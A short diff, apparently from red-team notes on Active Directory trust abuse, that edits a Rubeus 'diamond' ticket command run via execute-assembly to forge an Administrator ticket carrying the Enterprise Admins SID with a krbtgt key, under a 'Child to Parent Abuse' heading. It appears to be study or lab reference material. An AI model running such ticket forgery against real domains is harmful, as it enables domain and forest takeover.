@@ -13,10 +13,10 @@
 | 2     | `TRUST_DIRECTION_OUTBOUND`      |
 | 3     | `TRUST_DIRECTION_BIDIRECTIONAL` |
 
-```
+```powershell
 39610acedf7a66db295ee28263e7ad75234ae7884dbde20a4890bf97f7b8872b
 
-execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /krbkey:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /nowrap
+execute-assembly ~/opt/Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-1470357062-2280927533-300823338-519 /krbkey:39610acedf7a66db295ee28263e7ad75234ae7884dbde20a4890bf97f7b8872b /nowrap
 ```
 ##### Child to Parent Abuse
 
